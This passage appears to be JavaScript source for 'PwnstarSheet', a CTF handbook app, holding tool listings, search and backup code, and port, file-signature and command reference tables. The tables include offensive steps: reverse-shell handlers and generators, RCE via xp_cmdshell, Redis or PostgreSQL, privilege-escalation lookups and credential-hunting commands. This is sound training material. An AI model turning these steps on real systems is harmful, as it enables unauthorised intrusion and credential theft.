'strcmp'), {onEnter: args => console.log(args[1].readUtf8String())}) logs strcmp comparisons.", "link": "https://frida.re"}, {"name": "tmux", "platform": "Linux", "priority": "Important", "desc": "Terminal multiplexer for managing multiple sessions", "why": "Keep multiple terminal windows organized during long CTF sessions", "tips": "Ctrl+b c creates a new window. Ctrl+b % splits vertically. Ctrl+b arrow moves panes. Ctrl+b d detaches without killing the session. tmux attach reconnects. Use tmux new -s ctf to name sessions.", "link": "https://github.com/tmux/tmux"}, {"name": "Docker", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Container platform for isolated environments", "why": "Spin up environments that match remote CTF infrastructure exactly", "tips": "docker run -it ubuntu:20.04 bash creates a throwaway environment. Mount files with -v $(pwd):/work. Use Dockerfile to create reproducible exploit environments. PWN challenges often provide a Docker image to match the remote libc.", "link": "https://www.docker.com"}, {"name": "git", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Version control system and source code leak hunter", "why": "Source code leaks via exposed .git directories are a common CTF vector", "tips": "Use git-dumper against exposed .git directories: git-dumper http://target.com/.git ./output. Then git log --all shows commit history. git show commit_hash reveals code changes. Secrets in old commits are a classic CTF finding.", "link": "https://git-scm.com"}, {"name": "ipython", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Enhanced interactive Python shell", "why": "Rapidly prototype and test CTF solver snippets interactively", "tips": "Better than python3 REPL: tab completion, syntax highlighting, magic commands (%timeit, %paste). Use it to quickly test crypto math, binary parsing, or regex patterns before writing a full script.", "link": "https://ipython.org"}, {"name": "qemu-user", "platform": "Linux", "priority": "Important", "desc": "User-mode emulator for foreign CPU architectures", "why": "Run and test exploits on ARM and MIPS binaries locally", "tips": "qemu-arm ./arm_binary runs ARM ELF on x86 Linux. qemu-arm -g 1234 ./binary starts a GDB stub on port 1234 for remote debugging with gdb-multiarch. Set LD_LIBRARY_PATH to point to ARM libc libraries.", "link": "https://www.qemu.org"}, {"name": "gdb-multiarch", "platform": "Linux", "priority": "Important", "desc": "GDB with support for multiple CPU architectures", "why": "Debug ARM, MIPS, and PowerPC binaries on an x86 machine", "tips": "target remote :1234 connects to a qemu-user GDB stub. set architecture arm sets the target arch manually if auto-detect fails. Combine with pwndbg for the same enhanced interface as regular GDB.", "link": "https://packages.ubuntu.com/focal/gdb-multiarch"}, {"name": "jq", "platform": "Linux/CLI", "priority": "Important", "desc": "Command-line JSON processor for slicing, filtering, and transforming JSON data.", "why": "Constantly useful for parsing API responses and JSON-based challenge data from the command line.", "tips": "Use jq '.' to pretty-print, and jq '.[] | select(.field==\"value\")' to filter arrays.", "link": "https://jqlang.github.io/jq/"}, {"name": "fzf", "platform": "Linux/Win/Mac", "desc": "Command-line fuzzy finder that makes navigating files, history, and command output interactive and fast.", "why": "Speeds up CTF work by making large outputs searchable instantly; pair with history for fast command recall.", "tips": "ctrl+r with fzf installed for fuzzy history search. cat largefile.txt | fzf to interactively search. pipe any output.", "link": "https://github.com/junegunn/fzf"}, {"name": "CyberChef API", "platform": "Linux/Python", "desc": "Programmatic access to CyberChef operations via the node.js API for automated pipeline encoding/decoding.", "why": "Automate multi-step encoding/decoding pipelines in Python or shell scripts for batch processing.", "tips": "Use cyberchef-recipes npm package. Or call the CyberChef web app with URL-encoded recipe for quick batch ops.", "link": "https://github.com/gchq/CyberChef"}, {"name": "VSCodium", "platform": "Linux/Win/Mac", "desc": "Open-source build of VS Code without Microsoft telemetry; same extensions and functionality.", "why": "Same as VS Code but better for CTF environments where you prefer not to have telemetry enabled.", "tips": "Install Hex Editor, Python, Remote SSH, and GitLens extensions for a complete CTF development environment.", "link": "https://vscodium.com"}, {"name": "Obsidian", "platform": "Linux/Win/Mac", "desc": "Markdown knowledge base for personal notes with graph view, linking, and templates.", "why": "Best note-taking tool for CTF; link challenge notes, track methodologies, and build personal writeup templates.", "tips": "Create a CTF vault template with sections: description, files, recon findings, tools tried, solution, flag.", "link": "https://obsidian.md"}, {"name": "pwncat", "platform": "Linux/Python", "desc": "Feature-rich netcat replacement with PTY upgrade, file transfer, reverse shell handler, and persistence.", "why": "Catches reverse shells properly with full PTY; automatic handling of shell stabilization.", "tips": "pwncat-cs -lp 4444. Once shell connects: Ctrl+D to drop to local shell, upload/download for file transfer.", "link": "https://github.com/calebstewart/pwncat"}, {"name": "Searchsploit", "platform": "Linux", "desc": "CLI search tool for Exploit-DB's database; finds exploits for specific software versions offline.", "why": "Quickly find publicly available exploits for any version of software encountered in a CTF target.", "tips": "searchsploit apache 2.4.49 to find specific version exploits. -x to view exploit code. -m to mirror to current dir.", "link": "https://www.exploit-db.com/searchsploit"}, {"name": "PwnBox", "platform": "Kali/Docker", "desc": "HackTheBox's Parrot OS-based attack box with all tools pre-configured and VPN connected.", "why": "Zero-setup environment; spin up in browser and immediately access HTB challenges without local Kali setup.", "tips": "Available from HTB 'Pwnbox' button on any machine page. 2-hour sessions for free users, unlimited for VIP.", "link": "https://app.hackthebox.com/pwnbox"}], "toolgrid-misc": [{"name": "Kali Linux", "platform": "Linux", "priority": "Must Master", "desc": "Penetration testing distribution", "why": "Pre-loaded with virtually every CTF tool; the standard CTF platform", "tips": "Use as a VM (VirtualBox or VMware) or install natively. Keep it updated with apt update && apt full-upgrade. The Kali Tools page lists every pre-installed tool by category. Use Kali NetHunter for mobile CTF work.", "link": "https://www.kali.org"}, {"name": "dcode.fr", "platform": "Web", "priority": "Must Master", "desc": "Online solver for 200+ ciphers and encoding schemes", "why": "Identifies and solves unknown classical ciphers and encodings", "tips": "Always start with the Cipher Identifier when you do not recognize the encoding. Covers everything from Morse code to Enigma. The tools work entirely in the browser with no data sent to a server.", "link": "https://www.dcode.fr"}, {"name": "PicoCTF", "platform": "Web", "priority": "Must Master", "desc": "Beginner-friendly CTF practice platform by Carnegie Mellon", "why": "The best starting point for absolute CTF beginners", "tips": "Work through challenges in order of difficulty. Read the hints. After solving, search for writeups of challenges you found hard to learn alternative approaches. The picoGym lets you practice old challenges anytime.", "link": "https://picoctf.org"}, {"name": "HackTheBox", "platform": "Web", "priority": "Must Master", "desc": "Professional machine hacking and CTF platform", "why": "Industry-standard practice for intermediate and advanced players", "tips": "Start with retired easy machines which have official writeups available. Use the Starting Point machines for a guided intro. Join a team for Pro Labs. Completing HTB machines is the single best way to improve real CTF skills.", "link": "https://www.hackthebox.com"}, {"name": "CTFtime", "platform": "Web", "priority": "Must Master", "desc": "Global CTF event calendar and writeup archive", "why": "Find upcoming CTF competitions and study past writeups", "tips": "Check the upcoming events calendar weekly and register for rated CTFs. Read writeups from challenges you could not solve; this is the fastest way to learn new techniques. The team rankings help measure your progress.", "link": "https://ctftime.org"}, {"name": "GTFOBins", "platform": "Web", "priority": "Must Master", "desc": "Unix binary privilege escalation reference", "why": "Find privesc and shell escape techniques for any SUID or sudo binary", "tips": "Search for the binary name you have sudo rights to or that has SUID bit set. Copy the exact command shown. Essential for Linux privilege escalation in CTF post-exploitation. Memorize the most common ones: find, python, vim, less.", "link": "https://gtfobins.github.io"}, {"name": "CyberChef", "platform": "Web / Local", "priority": "Must Master", "desc": "Universal data transformation tool", "why": "If you learn only one tool for CTF, make it CyberChef", "tips": "Use it for everything from base64 decoding to AES decryption to extracting files from hex. The Magic operation auto-identifies unknown encodings. Download the offline version from GitHub for network-restricted CTF environments.", "link": "https://gchq.github.io/CyberChef"}, {"name": "LOLBAS", "platform": "Web", "priority": "Must Master", "desc": "Living-off-the-land Windows binary reference", "why": "Windows equivalent of GTFOBins for download, execute, and bypass techniques", "tips": "Search for binaries you find on a Windows box. Each entry shows how the binary can download files, execute code, or bypass security controls using only trusted Windows components. Essential for Windows post-exploitation.", "link": "https://lolbas-project.github.io"}, {"name": "Parrot OS", "platform": "Linux", "priority": "Important", "desc": "Privacy and security focused Linux distribution", "why": "Lighter weight Kali alternative with strong CTF tooling", "tips": "Choose Parrot Home for a lighter install or Parrot Security for the full toolkit. Uses less RAM than Kali making it better on older hardware. The AnonSurf tool routes traffic through Tor for privacy during OSINT challenges.", "link": "https://parrotsec.org"}, {"name": "LinPEAS", "platform": "Linux", "priority": "Important", "desc": "Linux privilege escalation enumeration script", "why": "Automated local privilege escalation checks in post-exploitation", "tips": "Upload with wget or curl to the target and run chmod +x linpeas.sh && ./linpeas.sh. Look for the red highlighted findings first; those are the most critical. Checks SUID, sudo rights, writable paths, cron jobs, and many more vectors.", "link": "https://github.com/carlospolop/PEASS-ng"}, {"name": "pwncat-cs", "platform": "Linux", "priority": "Important", "desc": "Enhanced reverse and bind shell handler", "why": "Stabilized interactive shells with built-in file transfer and enumeration", "tips": "pwncat-cs -lp 4444 listens for incoming shells. Once connected use upload and download for file transfer. The built-in enumerate module runs privilege escalation checks automatically. Much better than a raw netcat listener.", "link": "https://github.com/calebstewart/pwncat"}, {"name": "Obsidian", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Markdown-based knowledge management for notes", "why": "Document flags, techniques, and writeups during CTF competitions", "tips": "Create a vault per CTF. Link notes between challenges to spot patterns. Use the graph view to visualize connections. Keep a template note with sections: recon, vulnerabilities found, exploits tried, flag. Speed and organization win CTFs.", "link": "https://obsidian.md"}, {"name": "VSCode", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Code editor with rich extension support", "why": "Edit exploit scripts, view hex, and syntax-highlight all languages", "tips": "Install extensions: Hex Editor for binary files, Python, Remote SSH for editing on remote boxes. Use the integrated terminal split view to edit and run scripts side by side. The Settings Sync feature keeps your config across CTF machines.", "link": "https://code.visualstudio.com"}, {"name": "awesome-hacker-search-engines", "platform": "Web reference", "priority": "Important", "desc": "Curated list of specialized search engines for hackers, covering exposed devices, leaked credentials, code repositories, certificates, and more.", "why": "A single reference point for dozens of niche search engines you'd otherwise never discover individually.", "tips": "Bookmark this and check it whenever a challenge needs information you can't find through Google.", "link": "https://awesome-hacker-search-engines.com/"}, {"name": "awesome-forensics", "platform": "Web reference", "priority": "Important", "desc": "Curated list of free and open-source digital forensics tools, covering memory analysis, disk imaging, mobile forensics, and more.", "why": "A comprehensive map of the forensics tooling landscape, useful when your usual tools can't handle a specific file type.", "tips": "Use it to discover specialized tools for unusual formats (mobile backups, virtual machine images, etc.).", "link": "https://cugu.github.io/awesome-forensics/"}, {"name": "OSINT Web (astrosp)", "platform": "Web reference", "priority": "Important", "desc": "Curated collection of OSINT tools and resources organized by category (people search, image analysis, social media, geolocation).", "why": "A quick-access hub when starting any OSINT challenge from scratch.", "tips": "Check the geolocation and reverse image search sections first for CTF-style image challenges.", "link": "https://astrosp.github.io/osint-web/"}, {"name": "TryHackMe", "platform": "Web", "desc": "Guided cybersecurity learning platform with structured learning paths and interactive CTF-style challenges.", "why": "Best for beginners; structured rooms teach techniques progressively before competitive CTF pressure.", "tips": "Complete Pre-Security then Jr Penetration Tester paths. JuicyTomato, Buffer Overflow Prep, and Advent of Cyber are excellent.", "link": "https://tryhackme.com"}, {"name": "IppSec", "platform": "YouTube/Web", "desc": "YouTube channel with detailed video walkthroughs of HackTheBox machines, explaining every step and technique.", "why": "The single best resource for learning by example; watching IppSec solve machines teaches methodology deeply.", "tips": "Search ippsec.rocks for technique-based search across all videos. After solving a machine, always watch his video.", "link": "https://ippsec.rocks"}, {"name": "0xdf hacks stuff", "platform": "Blog", "desc": "In-depth CTF writeup blog covering HTB machines, CTF challenges, and custom tool development.", "why": "Extremely detailed writeups explain not just what to do but why; builds intuition for finding attack paths.", "tips": "Read writeups for machines you've solved to see alternative paths. Great for learning methodology depth.", "link": "https://0xdf.gitlab.io"}, {"name": "HackTricks", "platform": "Web", "desc": "Comprehensive penetration testing and CTF methodology wiki with techniques for every category.", "why": "The go-to reference during CTF; searchable wiki with copy-paste commands for most common attack scenarios.", "tips": "Bookmark the Pentesting Web section, Linux Privilege Escalation, and Active Directory pages for CTF use.", "link": "https://book.hacktricks.xyz"}, {"name": "RevShells", "platform": "Web", "desc": "Reverse shell generator that creates payloads for any language and shell type with encoding options.", "why": "Generates correct reverse shell one-liners for every language; saves time on syntax and encoding.", "tips": "Select your IP, port, and shell type. Enables base64 and URL encoding for WAF bypass. revshells.com is always handy.", "link": "https://www.revshells.com"}, {"name": "CyberDefenders", "platform": "Web", "desc": "Blue team and DFIR CTF platform with realistic incident response and forensics challenges.", "why": "Best platform specifically for forensics and defensive security CTF practice.", "tips": "Start with free challenges in Forensics and Threat Intel categories. BlueYard and Reveal are great beginner challenges.", "link": "https://cyberdefenders.org"}, {"name": "DFIR.training", "platform": "Web", "desc": "Curated database of digital forensics and incident response tools, courses, and resources.", "why": "Comprehensive DFIR resource hub for finding specialized forensics tools and learning materials.", "tips": "Use the tool list to find specialized tools for specific file types and forensics tasks not covered by common tools.", "link": "https://www.dfir.training"}]};


// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PHASE 0 â€” Unified Search Foundation + Backup System
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let SEARCH_INDEX = [];

function registerSearchable(entry){
  if(!entry.type || !entry.title || !entry.pageId){
    console.warn('registerSearchable: missing required field', entry);
    return;
  }
  entry.keywords = entry.keywords || [];
  const exists = SEARCH_INDEX.some(x => x.type===entry.type && x.title===entry.title && x.pageId===entry.pageId);
  if(exists) return;
  SEARCH_INDEX.push(entry);
}

function registerSearchableBulk(entries){ entries.forEach(registerSearchable); }

function indexExistingTools(){
  if(typeof TOOLS_DATA === 'undefined')return;
  const PAGE_MAP={'toolgrid-recon':'recon','toolgrid-web':'web','toolgrid-pwn':'pwn','toolgrid-re':'re','toolgrid-crypto':'crypto','toolgrid-forensics':'forensics','toolgrid-network':'forensics','toolgrid-passwords':'passwords','toolgrid-wireless':'wireless','toolgrid-frameworks':'frameworks','toolgrid-utilities':'utilities','toolgrid-misc':'utilities'};
  Object.entries(TOOLS_DATA).forEach(([grid,tools])=>{
    const pageId=PAGE_MAP[grid]||'utilities';
    tools.forEach(t=>{
      registerSearchable({type:'tool',title:t.name,keywords:[t.platform,t.desc,t.why,t.tips].filter(Boolean),pageId,snippet:t.desc});
    });
  });
}

function unifiedSearch(query,maxResults){
  maxResults=maxResults||30;
  const q=query.trim().toLowerCase();
  if(q.length<2)return[];
  const scored=[];
  for(const entry of SEARCH_INDEX){
    const titleMatch=entry.title.toLowerCase().includes(q);
    const kwMatch=entry.keywords.some(k=>k&&k.toLowerCase().includes(q));
    if(titleMatch||kwMatch){scored.push({entry,score:titleMatch?2:1});}
  }
  scored.sort((a,b)=>b.score-a.score);
  return scored.slice(0,maxResults).map(s=>s.entry);
}

function runCheatIndexSearch(){
  const q=document.getElementById('cheatIndexSearch').value;
  const out=document.getElementById('cheatIndexResults');
  const countEl=document.getElementById('ciResultCount');
  if(!q.trim()){out.innerHTML='<div class="ci-empty-state">Type to search, or browse by category using the sidebar.</div>';countEl.textContent='';return;}
  const results=unifiedSearch(q,50);
  countEl.textContent=`${results.length} result${results.length===1?'':'s'}`;
  if(!results.length){out.innerHTML='<div class="ci-empty-state">No matches. Try a different term.</div>';return;}
  out.innerHTML=results.map(r=>{
    return `<div class="ci-result" data-pageid="${escHtml(r.pageId)}" data-type="${escHtml(r.type)}" data-tool="${encodeURIComponent(r.title)}" onclick="handleCiResultClick(this)"><span class="ci-type-badge ${r.type}">${r.type}</span><span class="ci-result-title">${escHtml(r.title)}</span><span class="ci-result-kw">${escHtml(r.snippet||r.keywords.slice(0,3).join(', ')||'')}</span></div>`;
  }).join('');
}

function handleCiResultClick(el){
  const pid=el.dataset.pageid;
  const type=el.dataset.type;
  const tool=decodeURIComponent(el.dataset.tool||'');
  if(type==='tool'){ goToPageAndTool(pid,tool); }
  else{ goToPage(pid); }
}

function refreshCheatIndexCount(){
  const el=document.getElementById('ciIndexCount');
  if(el)el.textContent=SEARCH_INDEX.length;
}

function exportBackup(){
  try{
    const payload={_meta:{app:'PwnstarSheet',type:'backup',version:1,exported:new Date().toISOString()},notes:loadNotes(),board:loadBoard()};
    const blob=new Blob([JSON.stringify(payload,null,2)],{type:'application/json'});
    const url=URL.createObjectURL(blob);
    const a=document.createElement('a');
    const stamp=new Date().toISOString().slice(0,10);
    a.href=url;a.download=`PwnstarSheet_Backup_${stamp}.json`;
    document.body.appendChild(a);a.click();document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showBackupStatus('Backup exported successfully.',true);
  }catch(e){showBackupStatus('Export failed: '+e.message,false);}
}

function importBackup(file){
  if(!file)return;
  const reader=new FileReader();
  reader.onload=()=>{
    try{
      const data=JSON.parse(reader.result);
      if(!data||typeof data!=='object'||!data._meta||data._meta.app!=='PwnstarSheet'){showBackupStatus('Invalid backup file: not a recognized PwnstarSheet export.',false);return;}
      if(!Array.isArray(data.notes)||!Array.isArray(data.board)){showBackupStatus('Invalid backup file: notes/board data malformed.',false);return;}
      const cleanNotes=data.notes.filter(n=>n&&typeof n.body==='string');
      const cleanBoard=data.board.filter(c=>c&&typeof c.name==='string'&&typeof c.status==='string');
      saveNotes(cleanNotes);
      saveBoard2(cleanBoard);
      renderNotes();renderBoard();if(typeof renderDashboard==='function')renderDashboard();
      showBackupStatus(`Imported ${cleanNotes.length} note(s) and ${cleanBoard.length} task(s). Existing data overwritten.`,true);
    }catch(e){showBackupStatus('Import failed: file is not valid JSON.',false);}
  };
  reader.onerror=()=>showBackupStatus('Import failed: could not read file.',false);
  reader.readAsText(file);
}

function saveBoard2(cards){
  try{ boardCards=cards; localStorage.setItem('ps-board',JSON.stringify(cards)); }catch(e){}
}

function showBackupStatus(msg,ok){
  const el=document.getElementById('backupStatus');
  if(!el)return;
  el.textContent=msg;
  el.className='backup-status show '+(ok?'ok':'err');
  setTimeout(()=>el.classList.remove('show'),4000);
}

function copyCmdTemplate(btn,useFilled){
  const container=btn.closest('.cmd-example');
  if(!container)return;
  let text;
  if(useFilled&&container.dataset.filled){text=container.dataset.filled;}
  else{const clone=container.cloneNode(true);clone.querySelectorAll('.cmd-example-actions').forEach(el=>el.remove());text=clone.textContent.trim();}
  navigator.clipboard.writeText(text).then(()=>{const orig=btn.textContent;btn.textContent='Copied';setTimeout(()=>btn.textContent=orig,1200);}).catch(()=>{});
}

const PORT_REFERENCE = [
  {port:21,proto:'TCP',service:'FTP',why:'File transfer â€” often anonymous login enabled',check:['anonymous login','writable dirs','banner version'],tools:['nmap --script ftp-anon','ftp','hydra'],firstCmd:'nmap -sV -p21 --script ftp-anon,ftp-syst <target>',next:'â†’ searchsploit on banner version'},
  {port:22,proto:'TCP',service:'SSH',why:'Remote login â€” target for creds found elsewhere',check:['OpenSSH version/CVEs','key-based auth clues'],tools:['nmap -sV','hydra','ssh2john'],firstCmd:'nmap -sV -p22 <target>',next:'â†’ try any creds/keys found on the box'},
  {port:23,proto:'TCP',service:'Telnet',why:'Unencrypted login â€” immediately suspicious if present',check:['default creds','device banner'],tools:['nmap','telnet','hydra'],firstCmd:'nmap -sV -p23 <target>',next:'â†’ try admin:admin / root:root'},
  {port:25,proto:'TCP',service:'SMTP',why:'Mail transfer â€” username enum via VRFY/EXPN',check:['VRFY/EXPN support','open relay'],tools:['nmap --script smtp-enum-users','smtp-user-enum'],firstCmd:'nmap -sV -p25 --script smtp-enum-users <target>',next:'â†’ feed enumerated users into other services'},
  {port:53,proto:'TCP/UDP',service:'DNS',why:'Zone transfers can leak the entire namespace',check:['AXFR allowed','subdomains'],tools:['dig','dnsrecon','fierce'],firstCmd:'dig axfr @<target> <domain>',next:'â†’ enumerate leaked internal hostnames'},
  {port:80,proto:'TCP',service:'HTTP',why:'Largest attack surface in most boxes',check:['tech stack','robots.txt','/.git/','/.env'],tools:['whatweb','ffuf/gobuster','burp suite','nikto'],firstCmd:'whatweb http://<target> && ffuf -u http://<target>/FUZZ -w wordlist.txt',next:'â†’ content discovery â†’ manual testing'},
  {port:88,proto:'TCP/UDP',service:'Kerberos',why:'Confirms Active Directory environment',check:['valid usernames','no-preauth accounts'],tools:['kerbrute','Impacket GetNPUsers.py','GetUserSPNs.py','Rubeus'],firstCmd:'kerbrute userenum -d <domain> --dc <dc-ip> userlist.txt',next:'â†’ AS-REP roast â†’ Kerberoast'},
  {port:110,proto:'TCP',service:'POP3',why:'Legacy mail retrieval, cleartext by default',check:['creds reuse'],tools:['nmap','nc','hydra'],firstCmd:'nmap -sV -p110 <target>',next:'â†’ try creds found elsewhere'},
  {port:111,proto:'TCP/UDP',service:'RPCBind',why:'Maps RPC services â€” often paired with NFS',check:['registered RPC programs'],tools:['rpcinfo'],firstCmd:'rpcinfo -p <target>',next:'â†’ check NFS (2049)'},
  {port:139,proto:'TCP',service:'NetBIOS/SMB',why:'Legacy SMB, paired with 445',check:['NetBIOS name/workgroup'],tools:['nbtscan','enum4linux-ng'],firstCmd:'nbtscan <target>',next:'â†’ cross-reference with 445 findings'},
  {port:143,proto:'TCP',service:'IMAP',why:'Mail retrieval, folders unlike POP3',check:['STARTTLS support','creds reuse'],tools:['nmap','nc','hydra'],firstCmd:'nmap -sV -p143 <target>',next:'â†’ try known creds'},
  {port:161,proto:'UDP',service:'SNMP',why:'Default community strings are an easy win',check:['public/private community string'],tools:['snmpwalk','onesixtyone'],firstCmd:'snmpwalk -c public -v1 <target>',next:'â†’ dump full MIB tree for creds/config'},
  {port:389,proto:'TCP',service:'LDAP',why:'AD directory service â€” anonymous bind sometimes allowed',check:['anonymous bind','naming contexts'],tools:['ldapsearch','windapsearch','BloodHound'],firstCmd:'ldapsearch -x -h <target> -s base namingcontexts',next:'â†’ pull users/groups â†’ BloodHound'},
  {port:443,proto:'TCP',service:'HTTPS',why:'Same as HTTP + cert SAN can leak hostnames',check:['cert SAN','tech stack'],tools:['openssl s_client','whatweb','ffuf'],firstCmd:'openssl s_client -connect <target>:443 -servername <target>',next:'â†’ same flow as port 80'},
  {port:445,proto:'TCP',service:'SMB',why:'Windows/AD goldmine â€” high-value enumeration target',check:['shares','null sessions','users/domain info','signing enabled'],tools:['enum4linux-ng','smbclient','NetExec','Impacket'],firstCmd:'enum4linux-ng -A <target>',next:'â†’ BloodHound'},
  {port:993,proto:'TCP',service:'IMAPS',why:'IMAP over TLS',check:['TLS config','creds reuse'],tools:['nmap','openssl s_client'],firstCmd:'openssl s_client -connect <target>:993',next:'â†’ try known creds'},
  {port:1433,proto:'TCP',service:'MSSQL',why:'Common AD lateral movement point via xp_cmdshell',check:['weak sa creds','xp_cmdshell enabled','linked servers'],tools:['mssqlclient.py'],firstCmd:'mssqlclient.py <user>:<pass>@<target>',next:'â†’ enable xp_cmdshell for RCE'},
  {port:1521,proto:'TCP',service:'Oracle DB',why:'Default creds are common',check:['SID bruteforce','default creds'],tools:['odat','sqlplus'],firstCmd:'odat sidguess -s <target>',next:'â†’ try system/manager, scott/tiger'},
  {port:2049,proto:'TCP',service:'NFS',why:'World-readable/writable exports, no auth by default',check:['exported shares','writable dirs'],tools:['showmount','mount'],firstCmd:'showmount -e <target>',next:'â†’ mount + hunt for SSH keys/config'},
  {port:3306,proto:'TCP',service:'MySQL',why:'Default/weak root creds common',check:['blank root password','FILE privilege'],tools:['mysql client','hydra'],firstCmd:'mysql -h <target> -u root -p',next:'â†’ read/write local files via FILE priv'},
  {port:3389,proto:'TCP',service:'RDP',why:'Windows remote desktop',check:['NLA required','known CVEs (BlueKeep)'],tools:['xfreerdp','rdesktop','hydra'],firstCmd:'xfreerdp /v:<target> /u:<user> /p:<pass>',next:'â†’ try creds found elsewhere'},
  {port:5432,proto:'TCP',service:'PostgreSQL',why:'Default creds common, RCE via COPY TO PROGRAM',check:['default creds','COPY TO PROGRAM'],tools:['psql'],firstCmd:'psql -h <target> -U postgres',next:'â†’ RCE via COPY ... TO PROGRAM'},
  {port:5900,proto:'TCP',service:'VNC',why:'Often no-auth or weak password only',check:['auth type','no-auth access'],tools:['vncviewer','hydra'],firstCmd:'nmap -sV -p5900 --script vnc-info <target>',next:'â†’ connect with no password first'},
  {port:5985,proto:'TCP',service:'WinRM',why:'PowerShell remoting â€” full shell with valid creds',check:['creds validity'],tools:['evil-winrm','netexec'],firstCmd:'evil-winrm -i <target> -u <user> -p <pass>',next:'â†’ lateral movement inside AD'},
  {port:6379,proto:'TCP',service:'Redis',why:'No auth by default â€” RCE via file write',check:['no-auth access','writable config dir'],tools:['redis-cli'],firstCmd:'redis-cli -h <target>',next:'â†’ write SSH key or cron via CONFIG SET'},
  {port:8080,proto:'TCP',service:'HTTP-alt',why:'Common admin panel port (Tomcat, Jenkins)',check:['app fingerprint','default creds'],tools:['whatweb','ffuf'],firstCmd:'whatweb http://<target>:8080',next:'â†’ Tomcat manager / Jenkins script console'},
  {port:9200,proto:'TCP',service:'Elasticsearch',why:'No auth by default in older versions',check:['open indices','version CVEs'],tools:['curl'],firstCmd:'curl http://<target>:9200/_cat/indices?v',next:'â†’ dump indices for creds/PII'},
  {port:27017,proto:'TCP',service:'MongoDB',why:'No auth by default',check:['no-auth access'],tools:['mongo shell'],firstCmd:'mongo --host <target>',next:'â†’ show dbs â†’ dump collections'}
];

const FILE_SIGNATURES = [
  {hex:'FF D8 FF E0',ext:'JPG',mime:'image/jpeg',note:'JFIF format image'},
  {hex:'FF D8 FF E1',ext:'JPG',mime:'image/jpeg',note:'Exif format image'},
  {hex:'89 50 4E 47 0D 0A 1A 0A',ext:'PNG',mime:'image/png',note:'Portable Network Graphics'},
  {hex:'47 49 46 38 39 61',ext:'GIF',mime:'image/gif',note:'GIF89a image'},
  {hex:'42 4D',ext:'BMP',mime:'image/bmp',note:'Bitmap image'},
  {hex:'50 4B 03 04',ext:'ZIP',mime:'application/zip',note:'Also DOCX/XLSX/PPTX/JAR/APK'},
  {hex:'52 61 72 21 1A 07 00',ext:'RAR',mime:'application/x-rar-compressed',note:'RAR archive v4'},
  {hex:'7F 45 4C 46',ext:'ELF',mime:'application/x-elf',note:'Linux executable'},
  {hex:'4D 5A',ext:'EXE',mime:'application/x-msdownload',note:'Windows PE executable'},
  {hex:'25 50 44 46',ext:'PDF',mime:'application/pdf',note:'Adobe PDF'},
  {hex:'1F 8B 08',ext:'GZ',mime:'application/gzip',note:'GZIP compressed'},
  {hex:'42 5A 68',ext:'BZ2',mime:'application/x-bzip2',note:'BZip2 compressed'},
  {hex:'D0 CF 11 E0 A1 B1 1A E1',ext:'DOC/XLS',mime:'application/msword',note:'MS Office legacy binary'},
  {hex:'52 49 46 46',ext:'WAV/AVI',mime:'audio/wav or video/avi',note:'RIFF container'},
  {hex:'49 44 33',ext:'MP3',mime:'audio/mpeg',note:'MP3 with ID3 tag'},
  {hex:'0A 0D 0D 0A',ext:'PCAPNG',mime:'application/vnd.tcpdump.pcap',note:'Wireshark capture'},
  {hex:'D4 C3 B2 A1',ext:'PCAP',mime:'application/vnd.tcpdump.pcap',note:'Tcpdump capture'},
  {hex:'53 51 4C 69 74 65',ext:'SQLite',mime:'application/x-sqlite3',note:'SQLite database'},
  {hex:'CA FE BA BE',ext:'CLASS',mime:'application/java-vm',note:'Java class / Mach-O fat binary'}
];

const ENCODING_REFERENCE = [
  {name:'Base64',identify:'Ends in = or ==, charset A-Z a-z 0-9 + /',cmd:'echo "STRING" | base64 -d',tool:'CyberChef, base64 CLI',when:'First thing to try'},
  {name:'Hex',identify:'Only 0-9 a-f, even length',cmd:'echo "STRING" | xxd -r -p',tool:'xxd, CyberChef',when:'Raw bytes â€” crypto/pwn'},
  {name:'Binary',identify:'Only 0/1, length divisible by 8',cmd:"python3 -c \"print(int('STRING',2))\"",tool:'CyberChef',when:'Usually intermediate layer'},
  {name:'URL Encoding',identify:'Contains %XX sequences',cmd:"python3 -c \"import urllib.parse;print(urllib.parse.unquote('STRING'))\"",tool:'CyberChef',when:'Web params/cookies/headers'},
  {name:'ROT13',identify:'Readable-looking but garbled, same charset',cmd:"echo \"STRING\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'",tool:'tr, CyberChef',when:'Always worth a quick try'},
  {name:'XOR (single byte)',identify:'No pattern, random-looking bytes',cmd:'Use Multi-Decoder XOR tool (256-key brute force)',tool:"This handbook's XOR tool",when:'Common crypto challenge layer'}
];

const COMMAND_REFERENCE = {
  linux:[
    {group:'Enumeration',items:[
      {cmd:'whoami; id',desc:'Current user and groups'},
      {cmd:'sudo -l',desc:'Commands runnable as sudo'},
      {cmd:'find / -perm -4000 -type f 2>/dev/null',desc:'SUID binaries'},
      {cmd:'getcap -r / 2>/dev/null',desc:'Capabilities set on binaries'},
      {cmd:'cat /etc/crontab; ls -la /etc/cron.d',desc:'Scheduled cron jobs'}
    ]},
    {group:'Networking',items:[
      {cmd:'ip a',desc:'Interfaces and IPs'},
      {cmd:'ss -tulnp',desc:'Listening ports and owning processes'}
    ]},
    {group:'Files & search',items:[
      {cmd:'grep -r "password" / --include=*.{conf,txt,yml,env} 2>/dev/null',desc:'Search configs for creds'},
      {cmd:'find / -writable -type d 2>/dev/null',desc:'World-writable directories'}
    ]}
  ],
  windows:[
    {group:'Enumeration',items:[
      {cmd:'whoami /priv',desc:'Current privileges'},
      {cmd:'systeminfo',desc:'OS/patch level for known CVEs'},
      {cmd:'net user',desc:'Local users'}
    ]},
    {group:'AD / Domain',items:[
      {cmd:'whoami /groups',desc:'Domain group memberships'},
      {cmd:'net group "Domain Admins" /domain',desc:'List Domain Admins'}
    ]},
    {group:'Credential hunting',items:[
      {cmd:'findstr /si password *.txt *.ini *.config',desc:'Search files for password'}
    ]}
  ]
};

function switchErefTab(tab,btn){
